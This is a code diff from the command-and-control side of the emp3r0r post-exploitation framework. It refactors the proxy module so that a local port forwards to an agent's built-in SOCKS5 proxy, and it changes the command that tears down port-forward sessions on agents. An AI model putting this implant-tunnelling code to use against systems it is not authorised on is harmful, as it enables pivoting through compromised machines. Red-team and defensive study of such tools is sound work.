@@ -3,8 +3,8 @@ package cc
 import (
 	"context"
 	"fmt"
-	"strconv"
-	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 )
 
 func modulePortFwd() {
@@ -54,39 +54,18 @@ func modulePortFwd() {
 }
 
 func moduleProxy() {
-	// proxy
-	proxyCtx, proxyCancel := context.WithCancel(context.Background())
 	port := Options["port"].Val
 	status := Options["status"].Val
 
 	// port-fwd
 	var pf PortFwdSession
 	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
-	pf.Lport, pf.To = port, port
-
-	// proxy command, start socks5 server on agent
-	go func() {
-		if _, err := strconv.Atoi(port); err != nil {
-			CliPrintError("Invalid port: %v", err)
-			return
-		}
-		cmd := fmt.Sprintf("!proxy %s %s", status, port)
-		err := SendCmd(cmd, CurrentTarget)
-		if err != nil {
-			CliPrintError("SendCmd: %v", err)
-			return
-		}
-		defer proxyCancel() // mark proxy command as done
-	}()
+	pf.Lport, pf.To = port, "127.0.0.1:"+agent.ProxyPort
 
 	switch status {
 	case "on":
-		// port mapping
+		// port mapping of default socks5 proxy
 		go func() {
-			for proxyCtx.Err() == nil {
-				time.Sleep(100 * time.Millisecond)
-			}
-
 			err := pf.RunPortFwd()
 			if err != nil {
 				CliPrintError("PortFwd failed: %v", err)
@@ -95,14 +74,14 @@ func moduleProxy() {
 	case "off":
 		for id, session := range PortFwds {
 			if session.Description == fmt.Sprintf("%s (Local) -> %s (Agent)",
-				port,
-				port) {
+				pf.Lport,
+				pf.To) {
 				session.Cancel() // cancel the PortFwd session
 
 				// tell the agent to close connection
 				// make sure handler returns
-				cmd := fmt.Sprintf("!port_fwd %s stop", id)
-				err := SendCmd(cmd, CurrentTarget)
+				cmd := fmt.Sprintf("!delete_portfwd %s", id)
+				err := SendCmd(cmd, session.Agent)
 				if err != nil {
 					CliPrintError("SendCmd: %v", err)
 					return
